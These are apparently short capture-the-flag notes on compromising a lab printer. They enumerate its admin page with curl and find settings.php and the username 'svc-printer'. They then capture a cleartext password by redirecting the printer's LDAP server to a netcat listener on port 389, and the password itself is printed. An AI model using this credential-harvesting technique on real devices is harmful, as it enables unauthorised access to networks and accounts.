we can access the printer admin page but website doesn't load correctly.

we use `curl 10.129.230.186 | html2text` to try and see what the page looks like

we see there is a `settings` portion

we use `curl` again to try to find what directory `settings` is located in

`curl 10.129.230.186 | grep settings`

we find `settings.php`

---

we find a username: 
`svc-printer`

--- 

Looks like this printer is communicating with LDAP. We can edit the server address to our IP. Then we set up a listener on port 389

`sudo nc -lvnp 389`

Once we click update it sends this back to us


```
1edFg43012!!
```
